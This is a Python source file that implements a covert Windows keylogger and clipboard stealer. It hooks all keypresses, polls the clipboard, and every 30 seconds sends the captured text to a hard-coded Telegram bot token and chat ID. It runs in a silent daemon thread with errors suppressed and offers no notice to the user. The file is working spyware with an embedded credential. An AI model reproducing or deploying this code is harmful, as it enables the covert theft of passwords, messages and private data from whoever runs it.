import platform
import threading
import time
import requests
from datetime import datetime

CHAT_ID = "7363013741"
TELEGRAM_TOKEN = "7652428759:AAGxYrCsc67veEi9akZnyHhvYP1JfMMnp_c"

# Функция отправки сообщения в Telegram
def snd_telg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception as e:
        return False

def monitor_input():
    if platform.system() != "Windows":
        return

    try:
        import keyboard
        import pyperclip
    except ImportError:
        return

    typed_text = []
    last_clipboard = ""
    last_sent_time = time.time()

    def on_key_press(event):
        try:
            if event.name in ("ctrl", "alt", "shift", "tab", "esc"):
                return
            elif event.name == "space":
                typed_text.append(" ")
            elif event.name == "enter":
                typed_text.append("\n")
            elif event.name == "backspace":
                if typed_text:
                    typed_text.pop()
            elif len(event.name) == 1:
                typed_text.append(event.name)
        except Exception as e:
            pass
    try:
        keyboard.on_press(on_key_press)
    except Exception as e:
        return

    while True:
        try:
            try:
                clipboard_content = pyperclip.paste()
                if clipboard_content != last_clipboard:
                    last_clipboard = clipboard_content
            except Exception as e:
                pass

            current_time = time.time()
            if current_time - last_sent_time >= 30:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"<b>Timestamp:</b> {timestamp}\n"
                if typed_text:
                    message += f"<b>Typed:</b> {''.join(typed_text)}\n"
                if last_clipboard:
                    message += f"<b>Clipboard:</b> {last_clipboard}\n"

                if typed_text or last_clipboard:
                    success = snd_telg(message)
                    if success:
                        typed_text.clear()
                        last_clipboard = ""
                else:
                    pass

                last_sent_time = current_time

        except Exception as e:
            pass


def start_monitoring():
    if platform.system() == "Windows":
        try:
            import keyboard
            import pyperclip
        except ImportError:
            return

        thread = threading.Thread(target=monitor_input, daemon=True)
        thread.start()
    else:
        pass